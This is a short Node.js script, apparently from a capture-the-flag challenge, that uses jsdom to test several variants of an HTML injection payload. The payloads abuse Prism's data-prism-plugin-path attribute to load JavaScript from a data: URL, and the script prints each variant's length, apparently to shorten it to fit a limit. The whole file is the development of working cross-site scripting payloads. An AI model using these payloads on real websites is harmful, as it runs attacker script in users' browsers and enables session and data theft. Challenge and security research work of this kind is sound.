
const { JSDOM } = require('./challenge_mouse/app/node_modules/jsdom');
function parse(html) {
    const dom = new JSDOM(html);
    const doc = dom.window.document;
    const p1 = doc.querySelector('[data-prism-plugins]');
    const p2 = doc.querySelector('[data-prism-plugin-path]');
    return {
        plugins: p1 ? p1.getAttribute('data-prism-plugins') : null,
        pluginPath: p2 ? p2.getAttribute('data-prism-plugin-path') : null
    };
}

const tests = [
    '<p data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<p/data-prism-plugins/data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<a/data-prism-plugins/data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<a data-prism-plugins/data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<p/data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)//>',
];

for (const t of tests) {
    console.log(t.length, JSON.stringify(parse(t)), t);
}
